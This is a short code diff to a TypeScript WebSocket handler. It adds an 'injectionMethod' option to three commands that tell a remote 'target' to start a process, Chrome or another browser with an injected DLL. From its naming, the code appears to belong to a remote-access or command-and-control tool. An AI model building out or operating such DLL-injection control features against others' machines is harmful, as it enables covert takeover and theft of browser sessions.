@@ -1405,6 +1405,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         replace_path: String(payload.replace_path || ""),
         dll: dllData,
         display: state.display ?? 0,
+        injectionMethod: String(payload.injectionMethod || ""),
       };
       sendbackstageCommand(target, "backstage_start_process_injected", cmdPayload);
       break;
@@ -1420,6 +1421,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         path: String(payload.path || ""),
         dll: dllData,
         display: state.display ?? 0,
+        injectionMethod: String(payload.injectionMethod || ""),
       };
       sendbackstageCommand(target, "backstage_start_chrome_injected", chromeCmdPayload);
       break;
@@ -1439,6 +1441,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         killIfRunning: payload.killIfRunning === true,
         dll: dllData,
         display: state.display ?? 0,
+        injectionMethod: String(payload.injectionMethod || ""),
       };
       sendbackstageCommand(target, "backstage_start_browser_injected", browserCmdPayload);
       break;
